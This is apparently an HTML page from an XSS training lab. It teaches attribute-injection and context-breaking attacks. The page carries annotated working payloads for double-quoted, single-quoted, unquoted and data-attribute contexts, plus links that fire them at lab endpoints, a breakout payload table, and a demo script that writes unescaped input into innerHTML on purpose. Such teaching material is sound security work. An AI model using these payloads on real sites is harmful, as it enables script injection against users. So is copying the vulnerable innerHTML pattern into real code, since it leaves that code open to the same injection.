@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack 05 — Attribute Injection & Context Breaking</title>
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;
+          --green:#4ade80;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:32px}
+    .wrap{max-width:860px;margin:0 auto}
+    h1{font-size:28px;color:var(--gold);margin-bottom:6px}
+    .subtitle{color:var(--muted);font-size:14px;margin-bottom:32px}
+    .step{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:22px 24px;margin-bottom:16px}
+    .step-header{display:flex;align-items:baseline;gap:12px;margin-bottom:12px}
+    .step-num{background:var(--border);color:var(--cyan);font-size:11px;font-weight:700;
+              width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .step-title{font-size:14px;font-weight:700;color:var(--text)}
+    .step p{font-size:13.5px;color:var(--muted);line-height:1.6;margin-bottom:10px}
+    .payload{background:#060d1a;border:1px solid var(--border);border-radius:4px;
+             padding:10px 14px;font-family:'Courier New',monospace;font-size:12.5px;
+             color:var(--orange);margin:8px 0;word-break:break-all}
+    .payload .hl{color:var(--red);font-weight:700}
+    .btn{display:inline-block;padding:8px 16px;border:none;border-radius:4px;cursor:pointer;
+         font-size:13px;font-weight:600;margin:4px 4px 4px 0;text-decoration:none}
+    .btn-fire{background:#4a1515;color:var(--red);border:1px solid var(--red)}
+    .btn-fire:hover{background:#5a1515}
+    .btn-safe{background:#0a1f13;color:var(--green);border:1px solid var(--green)}
+    .btn-neutral{background:var(--bg2);color:var(--muted);border:1px solid var(--border)}
+    .result-box{min-height:50px;background:#060d1a;border:2px dashed var(--border);
+                border-radius:4px;padding:10px;font-size:12px;margin-top:8px;color:var(--muted)}
+    .tag{display:inline-block;font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;letter-spacing:.08em;margin-bottom:8px}
+    .tag-danger{background:#2d0a0a;color:var(--red);border:1px solid var(--red)}
+    .tag-note{background:#0f1f3a;color:var(--cyan);border:1px solid var(--border)}
+    .tag-dom{background:#1a0a2e;color:var(--purple);border:1px solid var(--purple)}
+    table{width:100%;border-collapse:collapse;font-size:12.5px;margin:12px 0}
+    th{background:var(--bg2);color:var(--cyan);padding:8px 10px;text-align:left;border-bottom:1px solid var(--border)}
+    td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top}
+    td:first-child{font-family:'Courier New',monospace;color:var(--orange);white-space:nowrap}
+    code{font-family:'Courier New',monospace;font-size:11.5px;background:#060d1a;color:var(--cyan);padding:1px 4px;border-radius:2px}
+    .nav{display:flex;justify-content:space-between;margin-bottom:28px;font-size:13px;color:var(--muted)}
+    .nav a{color:var(--cyan);text-decoration:none}
+    .annotation{display:grid;grid-template-columns:1fr;gap:2px;font-family:'Courier New',monospace;font-size:13px;line-height:1.8;background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:14px;margin:10px 0}
+    .ann-code{color:var(--orange)}
+    .ann-before{color:#4b5563}
+    .ann-inject{color:var(--red);font-weight:700;text-decoration:underline dotted}
+    .ann-after{color:var(--muted)}
+    .ann-note{font-family:-apple-system,sans-serif;font-size:11px;color:var(--muted);margin-top:4px}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="nav">
+    <a href="/">← Lab Home</a>
+    <span>Module 08 — Attribute Injection</span>
+  </nav>
+
+  <h1>Attack 05 — Attribute Injection & Context Breaking</h1>
+  <p style="color:var(--muted);font-size:14px;margin-bottom:32px">
+    Breaking out of attribute values to inject event handlers or new tags.
+    Covers double-quoted, single-quoted, unquoted, and data attributes.
+  </p>
+
+  <!-- ─── Step 1 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">1</div>
+      <div class="step-title">Double-quoted breakout — add event handler</div></div>
+    <span class="tag tag-danger">Executes on hover</span>
+    <p>
+      The template is <code>value="{q}"</code>. Injecting a double-quote closes
+      the attribute. Everything after becomes new tag content — we add a new
+      attribute (<code>onmouseover</code>), then open a dummy attribute
+      (<code>x="</code>) to absorb the trailing quote from the template.
+    </p>
+    <div class="annotation">
+      <div class="ann-before">value="</div>
+      <div class="ann-inject">" onmouseover="alert(document.domain)"  x="</div>
+      <div class="ann-after">"  ← original closing quote absorbed into x= value</div>
+      <div class="ann-note">Result in DOM: value="" onmouseover="alert(document.domain)" x=""</div>
+    </div>
+    <a class="btn btn-fire"
+       href='/attr-double?q=" onmouseover="alert(document.domain)" x="'
+       target="_blank">Fire on server</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:6px">On the destination page, hover over the input field to trigger.</p>
+  </div>
+
+  <!-- ─── Step 2 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">2</div>
+      <div class="step-title">Double-quoted breakout — zero interaction (autofocus)</div></div>
+    <span class="tag tag-danger">ZERO INTERACTION</span>
+    <p>
+      Adding <code>autofocus</code> to the injected payload causes the browser
+      to focus the element immediately on page load — firing <code>onfocus</code>
+      with no user action.
+    </p>
+    <div class="annotation">
+      <div class="ann-inject">" autofocus onfocus="alert(document.domain)" x="</div>
+      <div class="ann-note">Result: value="" autofocus onfocus="alert(document.domain)" x=""</div>
+    </div>
+    <a class="btn btn-fire"
+       href='/attr-double?q=" autofocus onfocus="alert(document.domain)" x="'
+       target="_blank">Fire (zero interaction)</a>
+  </div>
+
+  <!-- ─── Step 3 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">3</div>
+      <div class="step-title">Double-quoted breakout — close tag, inject new element</div></div>
+    <span class="tag tag-danger">ZERO INTERACTION</span>
+    <p>
+      A more aggressive breakout: close the attribute AND the tag entirely
+      with <code>"></code>, then inject a new element with its own event handler,
+      then repair the remaining template HTML with <code>&lt;input x="</code>.
+    </p>
+    <div class="annotation">
+      <div class="ann-inject">"><img src=x onerror=alert(1)><input x="</div>
+      <div class="ann-note">Result: value=""><img src=x onerror=alert(1)><input x=""</div>
+    </div>
+    <a class="btn btn-fire"
+       href='/attr-double?q="><img src=x onerror=alert(1)><input x="'
+       target="_blank">Fire tag-close breakout</a>
+  </div>
+
+  <!-- ─── Step 4 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">4</div>
+      <div class="step-title">Single-quoted attribute breakout</div></div>
+    <span class="tag tag-note">Different delimiter</span>
+    <p>
+      A partial fix that escapes <code>"</code> but leaves <code>'</code>
+      unescaped is still vulnerable when the template uses single-quote delimiters.
+      The break-out character changes but the technique is identical.
+    </p>
+    <div class="annotation">
+      <div class="ann-before">value='</div>
+      <div class="ann-inject">' onmouseover='alert(document.domain)' x='</div>
+      <div class="ann-after">'  ← closing quote absorbed</div>
+    </div>
+    <a class="btn btn-fire"
+       href="/attr-single?q=' onmouseover='alert(document.domain)' x='"
+       target="_blank">Fire single-quote breakout</a>
+    <button class="btn btn-safe" onclick="demoPartialFix()">Demo: double escaped, single still vulnerable</button>
+    <div class="result-box" id="step4-result">Click "Demo" to see the partial-fix scenario in the DOM.</div>
+  </div>
+
+  <!-- ─── Step 5 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">5</div>
+      <div class="step-title">Unquoted attribute — whitespace terminates</div></div>
+    <span class="tag tag-danger">No quote character needed</span>
+    <p>
+      An unquoted attribute value ends at the first whitespace character.
+      No quote injection required — a space in the payload is enough to
+      terminate the value and begin a new attribute name.
+    </p>
+    <div class="annotation">
+      <div class="ann-before">value=</div>
+      <div class="ann-inject">x onmouseover=alert(document.domain)</div>
+      <div class="ann-after">  ← space after 'x' ends value, starts new attribute</div>
+      <div class="ann-note">Result: value=x onmouseover=alert(document.domain)</div>
+    </div>
+    <a class="btn btn-fire"
+       href="/attr-unquoted?q=x onmouseover=alert(document.domain)"
+       target="_blank">Fire unquoted breakout</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:6px">Hover the input on the destination page.</p>
+  </div>
+
+  <!-- ─── Step 6 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">6</div>
+      <div class="step-title">data-* attribute → DOM XSS sink</div></div>
+    <span class="tag tag-dom">DOM XSS</span>
+    <span class="tag tag-danger" style="margin-left:4px">ZERO INTERACTION</span>
+    <p>
+      The server correctly places user input in a <code>data-query</code> attribute —
+      which is not rendered into the visible HTML body, so no tag injection occurs
+      server-side. However, the page's JavaScript reads <code>dataset.query</code>
+      and assigns it to <code>innerHTML</code> — a DOM XSS sink. The event handler
+      payload in the injected HTML fires immediately via <code>onerror</code>.
+    </p>
+    <div class="payload">/attr-data?q=&lt;img src=x onerror=alert('DOM XSS via data attribute sink')&gt;</div>
+    <a class="btn btn-fire"
+       href="/attr-data?q=<img src=x onerror=alert('DOM XSS via data attribute sink')>"
+       target="_blank">Fire DOM XSS via data attr</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:6px">
+      Note: the server-side HTML is not vulnerable — the injection happens
+      client-side when JS assigns <code>dataset.query</code> to <code>innerHTML</code>.
+    </p>
+  </div>
+
+  <!-- ─── Step 7 ─── -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">7</div>
+      <div class="step-title">Breakout Payload Reference Table</div></div>
+    <span class="tag tag-note">Reference</span>
+    <table>
+      <thead><tr><th>Context</th><th>Break-out char</th><th>Payload pattern</th><th>Interaction</th></tr></thead>
+      <tbody>
+        <tr><td>value="..."</td><td><code>"</code></td><td><code>" onmouseover="..."  x="</code></td><td>Hover</td></tr>
+        <tr><td>value="..."</td><td><code>"</code></td><td><code>" autofocus onfocus="..."  x="</code></td><td>None</td></tr>
+        <tr><td>value="..."</td><td><code>"></code></td><td><code>"><img onerror=...><x="</code></td><td>None</td></tr>
+        <tr><td>value='...'</td><td><code>'</code></td><td><code>' onmouseover='...' x='</code></td><td>Hover</td></tr>
+        <tr><td>value=...</td><td>space</td><td><code>x onmouseover=...</code></td><td>Hover</td></tr>
+        <tr><td>href="..."</td><td>N/A</td><td><code>javascript:alert(1)</code></td><td>Click</td></tr>
+        <tr><td>data-x="..."</td><td><code>"</code></td><td><code>" data-y="</code> (safe) or downstream sink</td><td>Varies</td></tr>
+        <tr><td>style="..."</td><td><code>"</code></td><td><code>"style="animation:x" onanimationstart=</code></td><td>None</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</div>
+
+<script>
+function demoPartialFix() {
+  const result = document.getElementById("step4-result");
+  // Simulate a developer who only escapes double-quotes
+  const userInput = "' onmouseover='alert(\"single-quote bypass\")' x='";
+  const escapedDouble = userInput.replace(/"/g, "&quot;");  // escapes " only
+  // Uses single-quote delimiters — still vulnerable
+  result.innerHTML = `
+    <p style="font-size:12px;color:#7a9bbf;margin-bottom:6px">
+      Input after escaping " only: <code>${escapedDouble}</code>
+    </p>
+    <p style="font-size:12px;color:#7a9bbf;margin-bottom:8px">
+      Template with single quotes — still injectable:
+    </p>
+    <input value='${userInput}' style="width:100%;padding:6px;background:#060d1a;color:#e2e8f0;border:1px solid #1e3a5f;border-radius:4px;font-size:12px">
+    <p style="font-size:11px;color:#f87171;margin-top:6px">Hover over the input above — onmouseover fires.</p>`;
+}
+</script>
+</body>
+</html>
